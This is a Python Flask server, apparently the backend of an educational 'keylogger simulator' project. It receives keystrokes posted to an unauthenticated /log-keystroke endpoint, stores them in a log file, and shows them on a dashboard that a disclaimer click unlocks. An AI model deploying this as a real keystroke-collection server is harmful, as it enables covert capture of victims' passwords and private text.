from flask import Flask, render_template, jsonify, session, request
import os
import logging
from datetime import datetime
from functools import wraps
from flask_cors import CORS

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Secure secret key for sessions

# Enable CORS to allow requests from your Vercel domain
CORS(app, origins=["https://www.finalyrproject.digital"])

# Configure logging
logging.basicConfig(
    filename='app.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "keylog.txt")

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('authenticated'):
            return render_template('disclaimer.html', error="Please acknowledge the disclaimer first")
        return f(*args, **kwargs)
    return decorated

@app.route('/')
@require_auth
def dashboard():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                logs = f.read().replace("\n", "<br>")
            logging.info("Logs retrieved successfully")
        else:
            logs = "No logs available."
            logging.warning("Log file not found")
    except Exception as e:
        logs = "Error reading logs"
        logging.error(f"Error reading logs: {str(e)}")
    return render_template("dashboard.html", logs=logs)

@app.route('/disclaimer', methods=['GET', 'POST'])
def disclaimer():
    if request.method == 'POST':
        session['authenticated'] = True
        logging.info("Disclaimer accepted")
        return jsonify({'success': True})
    return render_template("disclaimer.html")

@app.route('/logs', methods=['GET'])
@require_auth
def get_logs():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r', encoding="utf-8") as file:
                logs = file.read()
            logging.info("Logs fetched via API")
            return jsonify({'logs': logs, 'timestamp': datetime.now().isoformat()})
        else:
            return jsonify({'logs': "No logs available.", 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        logging.error(f"Error in /logs endpoint: {str(e)}")
        return jsonify({'error': "Error reading logs", 'timestamp': datetime.now().isoformat()}), 500

@app.route('/clear-logs', methods=['POST'])
@require_auth
def clear_logs():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "w", encoding="utf-8") as f:
                f.write("=== Keylogger Simulator Log - For Educational Use Only ===\n")
            logging.info("Logs cleared")
            return jsonify({'success': True})
    except Exception as e:
        logging.error(f"Error clearing logs: {str(e)}")
        return jsonify({'error': "Error clearing logs"}), 500

# New endpoint to receive keystroke data
@app.route('/log-keystroke', methods=['POST'])
def log_keystroke():
    try:
        data = request.json
        key = data.get('key')
        timestamp = datetime.now().isoformat()
        if key:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(f'{timestamp} - {key}\n')
            logging.info(f'Keystroke logged: {key}')
            return jsonify({'success': True})
        else:
            return jsonify({'error': 'No key provided'}), 400
    except Exception as e:
        logging.error(f"Error logging keystroke: {str(e)}")
        return jsonify({'error': 'Logging failed'}), 500

if __name__ == '__main__':
    app.run(debug=False, port=5000)  # Use debug=False in production
